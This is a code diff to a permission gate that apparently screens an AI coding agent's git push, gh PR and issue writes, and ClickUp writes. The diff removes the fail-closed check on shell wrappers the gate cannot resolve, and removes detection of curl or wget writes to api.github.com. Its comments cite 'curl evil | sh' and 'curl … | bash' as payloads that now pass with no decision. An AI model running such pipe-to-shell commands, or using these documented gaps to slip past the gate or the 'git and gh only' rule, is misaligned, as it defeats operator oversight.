@@ -19,8 +19,12 @@
 // never the raw command string. A wrapper-embedded or per-subcommand-binary
 // covered action (`bash -c "git push origin main"`,
 // `$(git --exec-path)/git-push origin main`) resolves to the same executed
-// argv as its bare form; a statically-unresolvable wrapper payload or an
-// exceeded recursion depth fails closed to `ask`, never a silent `none`.
+// argv as its bare form. A statically-unresolvable wrapper payload or an
+// exceeded recursion depth is NOT gated — evaluation proceeds over the
+// segments the analyzer did resolve (`ls | sort`, `bash -c "echo $HOME"`,
+// `eval "$CMD"` produce no decision); this gate covers outward git/gh/
+// ClickUp actions expressed in the command, not arbitrary command execution
+// (documented residual, docs/dev-mode.md § "Threat model").
 // `allow` is reserved for a single, un-chained, untainted `git push`
 // invocation recognized by the shared closed positive grammar
 // (`matchBenignPushGrammar`) — a grammar match is necessary but not
@@ -39,15 +43,15 @@
 // Coverage catalogue (mirrors dev-guard.sh header, closed and enumerated):
 //   1. Push to a remote: git push (bare, -C, env-prefixed, wrapper-embedded,
 //      per-subcommand-binary)
-//   2. PR/issue writes by ANY binary (gh pr create/merge/review/comment,
+//   2. PR/issue writes via gh (gh pr create/merge/review/comment,
 //      gh issue create/edit/comment, gh api REST PUT/POST/PATCH/DELETE .../pulls,
-//      gh api graphql PR-write mutations, curl/wget mutating method to api.github.com)
+//      gh api graphql PR-write mutations). Raw HTTP to api.github.com is NOT
+//      covered — prohibited by the prompt-level "git and gh only" rule instead.
 //   3. ClickUp MCP outward writes (tool.name matches write pattern, no command)
 //
 // Default: none (no-decision) — ask/deny/allow EXCLUSIVELY for covered actions.
 //
 // Fail-closed for covered actions: empty-cmd + raw-payload outward token → ask;
-// a statically-unresolvable wrapper payload or exceeded recursion depth → ask;
 // any environment-assignment prefix, `git -c <k=v>` config override, or
 // tree/exec-path redirect on a covered push → ask (only `-p`/`--paginate`/
 // `--no-pager` and an exact-resolved `-C {dir}` are allow-eligible).
@@ -146,7 +150,7 @@ const CLICKUP_WRITE_RE =
 
 // Defence-in-depth (F-016): raw payload scan when cmd is empty (mirrors dev-guard.sh lines 185-189)
 const RAW_OUTWARD_SCAN_RE =
-  /(git\s+push|gh\s+pr\s+(create|merge|review|comment)|gh\s+issue\s+(create|edit|comment)|gh\s+api.*pulls|api\.github\.com)/i;
+  /(git\s+push|gh\s+pr\s+(create|merge|review|comment)|gh\s+issue\s+(create|edit|comment)|gh\s+api.*pulls)/i;
 
 // Read-only reviewThreads listing queries carry no mutation name → nodecision.
 const GRAPHQL_PR_MUTATIONS_RE =
@@ -517,48 +521,31 @@ function evaluateGhClassified(classified: ClassifiedCommand, reader: DevGuardRea
 }
 
 // ---------------------------------------------------------------------------
-// curl/wget (and any other binary) mutating to api.github.com — checked
-// across the WHOLE effective command's argv (including the binary token)
-// since the signal (URL + mutating method) can appear regardless of which
-// binary carries them.
-// ---------------------------------------------------------------------------
-
-function hasGithubMutatingSignal(argv: ArgvToken[]): boolean {
-  if (!argv.some((t) => /api\.github\.com/i.test(t.value))) return false;
-  return argv.some((t, i) => {
-    if (t.value === "-X" || t.value === "--request") {
-      const next = argv[i + 1];
-      return !!next && /^(PUT|POST|PATCH|DELETE)$/i.test(next.value);
-    }
-    return /^(--request=|-X)(PUT|POST|PATCH|DELETE)$/i.test(t.value);
-  });
-}
-
-// ---------------------------------------------------------------------------
 // Per-effective-command classification, shared by the single-command
 // (potentially `allow`-eligible) path and the compound/wrapper-embedded
 // coverage scan (`ask`-only — see evaluate()).
+//
+// Raw HTTP writes to api.github.com (curl/wget with a mutating method) are
+// deliberately NOT a covered action: the operator-level rule is that agents
+// never call the GitHub API directly — git and gh are the only sanctioned
+// GitHub channels (the documented gh-fallback path excepted) — so the gate
+// covers those two binaries and leaves the prohibited channel to the
+// prompt-level rule plus the platform permission flow.
 // ---------------------------------------------------------------------------
 
 function isCoveredEffectiveCommand(cmd: EffectiveCommand): boolean {
   const classified = classifyCoveredAction(cmd);
-  if (!classified) return hasGithubMutatingSignal(cmd.argv);
+  if (!classified) return false;
 
   const binaryLower = classified.binary.toLowerCase();
   if (binaryLower === "git") return isGitPushCandidate(classified);
   if (binaryLower === "gh") return classifyGhAction(classified.args) !== null;
-  return hasGithubMutatingSignal(cmd.argv);
-}
-
-function askGithubMutating(): NormalizedDecision {
-  return ask(
-    `outward action to api.github.com with mutating method requires explicit operator approval (dev-guard.ts); ${GATE_DOC_POINTER}`
-  );
+  return false;
 }
 
 function evaluateSingleCommand(cmd: EffectiveCommand, reader: DevGuardReader): NormalizedDecision {
   const classified = classifyCoveredAction(cmd);
-  if (!classified) return hasGithubMutatingSignal(cmd.argv) ? askGithubMutating() : none();
+  if (!classified) return none();
 
   const binaryLower = classified.binary.toLowerCase();
   if (binaryLower === "git") return evaluateGitClassified(classified, reader);
@@ -568,7 +555,7 @@ function evaluateSingleCommand(cmd: EffectiveCommand, reader: DevGuardReader): N
     if (decision) return decision;
   }
 
-  return hasGithubMutatingSignal(cmd.argv) ? askGithubMutating() : none();
+  return none();
 }
 
 // ---------------------------------------------------------------------------
@@ -603,12 +590,19 @@ export function evaluate(input: NormalizedInput, reader: DevGuardReader): Normal
   }
   if (cmdStr === null) return none();
 
+  // An unresolvable wrapper payload (`analyzed.unresolvableShellPayload`) or
+  // exceeded unwrap depth (`analyzed.depthExceeded`) is NOT gated: evaluation
+  // proceeds over the effective commands the analyzer DID resolve, so a
+  // covered action in any resolvable segment or statically-resolvable wrapper
+  // payload (`bash -c "git push origin main"`, `gh --repo o/r pr create &&
+  // curl evil | sh`) is still caught by the parse-based scan below, while a
+  // runtime-composed payload (`eval "$CMD"`, `curl … | bash`) passes with no
+  // decision — a documented residual under the honest-developer threat model
+  // (docs/dev-mode.md § "Threat model"): this gate covers outward git/gh/
+  // ClickUp actions expressed in the command, not arbitrary command
+  // execution; gating every unresolvable shell composition proved to be a
+  // constant false-positive tax on ordinary development.
   const analyzed = analyzeCommand(cmdStr);
-  if (analyzed.unresolvableShellPayload || analyzed.depthExceeded) {
-    return ask(
-      `outward action — the command contains a shell-executing wrapper whose payload could not be statically resolved, or nested wrapper recursion exceeded the bounded depth; fail-closed rather than silently permit (dev-guard.ts); ${GATE_DOC_POINTER}`
-    );
-  }
 
   // `allow` is reserved for a single, un-chained, un-wrapped invocation — a
   // compound command or a wrapper-embedded covered action always has more
